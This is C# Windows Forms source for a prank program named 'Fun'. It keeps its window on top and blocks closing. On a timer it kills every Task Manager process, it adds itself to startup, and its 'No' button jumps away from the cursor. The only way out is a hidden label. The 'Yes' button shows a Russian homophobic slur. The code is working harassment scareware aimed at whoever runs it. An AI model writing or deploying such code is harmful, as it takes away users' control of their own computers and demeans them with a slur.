using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Fun
{
    public partial class Form1 : Form
    {
        private bool safeExitter = false;//позволяет нам закрыть программу
        public Form1()
        {
            InitializeComponent();
            this.TopMost = true;
            this.MinimizeBox=false;
        }                 
        private void DeleteTaskManager(object sender,EventArgs e)
        {
            try
            {
                Process[] processes = Process.GetProcessesByName("Taskmgr");
                foreach (Process process in processes)
                {
                    process.Kill();
                }
            }
            catch
            {

            }
        }
        private void Yesbutton_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Я знал что ты пидорюга ещё та!");
        }

        private void Nobutton_Click(object sender, EventArgs e)
        {
            Random random = new Random();
            Point point = new Point();
            point.X = random.Next(50, 700);
            point.Y= random.Next(100, 400);
            Nobutton.Location= point;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason != CloseReason.None && safeExitter==false)
            {
                e.Cancel = true;
            }
        }      
        private void Form1_Load(object sender, EventArgs e)
        {
            Timerr timerr=new Timerr(DeleteTaskManager);
            timerr.StartTimer();
            AutoStartup autoStartup = new AutoStartup();
            autoStartup.SetStartup(true);
           // this.ShowInTaskbar = false;
        }
        private void label2_Click(object sender, EventArgs e)
        {
            AutoStartup autoStartup = new AutoStartup();
            autoStartup.SetStartup(false);
            safeExitter = true;
            Application.Exit();
        }       
    }
}
